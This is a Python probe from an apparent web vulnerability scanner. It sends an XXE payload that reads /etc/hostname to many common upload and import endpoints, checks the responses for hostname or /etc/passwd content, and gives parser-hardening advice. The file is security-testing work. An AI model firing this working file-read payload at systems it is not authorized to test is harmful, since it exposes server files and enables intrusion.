#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
XXE: any XML-accepting endpoint (multipart upload OR
application/xml POST) that resolves an external entity.

Generalises `xxe_file_upload` (Juice Shop's `/file-upload`). The
underlying bug is "the XML parser hasn't disabled DTD external-
entity resolution"; the literal endpoint is irrelevant. We sweep
common upload / parse / import endpoints with both multipart-XML
and direct application/xml POSTs, looking for `/etc/hostname`
echo as the high-fidelity signal.

The hostname file is the right marker: every Linux host has it,
the contents are a single short line, and nothing else returns
that exact byte sequence in response to an XML upload.
"""
from __future__ import annotations

import re
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

UPLOAD_ENDPOINTS = (
    "/file-upload",                 # Juice Shop's literal
    "/upload", "/api/upload",
    "/api/files", "/api/v1/upload",
    "/api/import", "/api/v1/import",
    "/api/parse", "/api/v1/parse",
    "/import-xml", "/api/import-xml",
    "/api/svg",
)

# /etc/hostname is one short ASCII line. We use a generic regex
# that matches any single-line lowercase-alphanumeric value of 1-63
# chars (RFC 1123 hostname constraints). The XXE response will
# contain this near the start of the response body if the parser
# resolved the entity.
HOSTNAME_RE = re.compile(r"^[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?$",
                          re.MULTILINE)
# Belt and braces: also look for /etc/passwd-shape lines, in case
# the server normalises hostnames.
PASSWD_RE = re.compile(r"^root:x:0:0:", re.MULTILINE)


def _xxe_payload(token: str, target: str = "file:///etc/hostname"
                  ) -> bytes:
    """An XXE payload that retrieves a file via the SYSTEM external
    entity. The marker token isn't needed for /etc/hostname (we
    detect by signature) but appears in the doctype name to help
    diagnose."""
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE dast-xxe-{token} [\n'
        f'  <!ENTITY xxe SYSTEM "{target}">\n'
        f']>\n'
        f'<root>&xxe;</root>'
    ).encode()


def _multipart(field_name: str, payload: bytes, filename: str = "x.xml"
                ) -> tuple[bytes, str]:
    """Hand-roll a multipart/form-data body so we don't pull in a
    new dep. Returns (body, content-type)."""
    boundary = "----dast" + secrets.token_hex(8)
    parts = [
        (f"--{boundary}\r\n"
         f'Content-Disposition: form-data; name="{field_name}"; '
         f'filename="{filename}"\r\n'
         f"Content-Type: application/xml\r\n\r\n").encode(),
        payload,
        f"\r\n--{boundary}--\r\n".encode(),
    ]
    body = b"".join(parts)
    return body, f"multipart/form-data; boundary={boundary}"


class XxeAnyXmlUploadProbe(Probe):
    name = "xxe_any_xml_upload"
    summary = ("Detects XXE on any XML-accepting endpoint by sending "
               "an external-entity payload that retrieves "
               "/etc/hostname.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--endpoint", action="append", default=[],
            help="Additional upload / parse endpoint.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        endpoints = list(UPLOAD_ENDPOINTS) + list(args.endpoint or [])

        token = secrets.token_hex(6)
        payload = _xxe_payload(token)

        attempts: list[dict] = []
        confirmed: dict | None = None
        for ep in endpoints:
            url = urljoin(origin, ep)
            # Try both multipart and direct XML POST per endpoint.
            for kind in ("multipart", "xml"):
                if kind == "multipart":
                    body, ctype = _multipart("file", payload)
                else:
                    body, ctype = payload, "application/xml"
                r = client.request("POST", url, headers={
                    "Content-Type": ctype,
                    "Accept": "*/*",
                }, body=body)
                row: dict = {"endpoint": ep, "kind": kind,
                             "status": r.status, "size": r.size}
                # Either marker hits the body, OR the response
                # body parses as XML and contains /etc/hostname-shape
                # text near our entity reference.
                if r.status in (200, 201, 400) and r.body:
                    text = r.text or ""
                    if PASSWD_RE.search(text):
                        row.update({"hit": "passwd",
                                    "snippet": text[:200]})
                        confirmed = row
                        attempts.append(row)
                        break
                    # /etc/hostname returned standalone is just a
                    # single short line. We look for it in two
                    # positions: between an XML tag pair, or as
                    # the entire response body.
                    stripped = text.strip()
                    # If the response is a short hostname-shape
                    # alone, that's a confident hit.
                    if (1 <= len(stripped) <= 80
                            and HOSTNAME_RE.match(stripped)):
                        row.update({"hit": "hostname-bare",
                                    "snippet": stripped})
                        confirmed = row
                        attempts.append(row)
                        break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "marker_token": token,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(
                    f"Confirmed: XXE at {origin}{confirmed['endpoint']} "
                    f"({confirmed['kind']}). The XML parser resolved "
                    f"the SYSTEM external entity and returned "
                    f"`{confirmed['hit']}` shape content. Snippet: "
                    f"{confirmed.get('snippet','')[:160]!r}"),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Disable DTD external-entity resolution on the "
                    "XML parser:\n"
                    "  - Java: `factory.setFeature("
                    "  \"http://apache.org/xml/features/disallow-doctype-decl\""
                    ", true);` on every XMLReader / SAXParser / DOM "
                    "  builder.\n"
                    "  - Python lxml: `etree.XMLParser(resolve_entities=False, "
                    "  no_network=True, dtd_validation=False)`.\n"
                    "  - PHP: `libxml_disable_entity_loader(true)` "
                    "  before parsing (or update to PHP 8 where it's "
                    "  default-off).\n"
                    "  - .NET: `XmlReaderSettings { DtdProcessing = "
                    "  Prohibit }`.\n"
                    "  - Node libxmljs: `parseXml(xml, { noent: false, "
                    "  nonet: true })`.\n"
                    "Then audit any data the application has parsed "
                    "from XML during the exposure window for SSRF "
                    "fan-out (the parser may have fetched internal "
                    "resources)."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tried {len(attempts)} XML-accepting "
                     f"combinations on {origin}; none reflected the "
                     "external-entity content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    XxeAnyXmlUploadProbe().main()
